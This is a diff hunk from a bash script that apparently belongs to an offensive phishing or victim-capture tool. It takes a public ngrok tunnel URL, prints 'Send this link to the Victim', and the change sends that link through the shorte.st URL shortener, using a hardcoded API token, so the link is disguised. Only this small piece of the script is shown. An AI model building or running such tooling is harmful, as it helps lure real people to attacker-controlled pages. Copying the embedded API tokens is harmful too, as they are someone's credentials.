@@ -423,11 +423,8 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
-#HTTP_CODE=$(curl --write-out "%{http_code}\n" "https://samples.openweathermap.org/data/2.5/weather?q=London,uk&appid=b6907d289e10d714a6e88b30761fae22" --output output.txt --silent)
-#echo $HTTP_CODE 
-HTTP_CODE=$(curl -H "public-api-token: af30f46210691ddbfc7bd89257c31503" -X PUT -d "urlToShorten=$link" --write-out "%{http_code}\n" "https://api.shorte.st/v1/data/url" --output output.txt --silent)
-echo $HTTP_CODE 
-#printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
+short_link=$(curl -s -H "public-api-token: af30f46210691ddbfc7bd89257c31503" -X PUT -d "urlToShorten="$link https://api.shorte.st/v1/data/url)
+printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
 echo ""
 
 checkfound
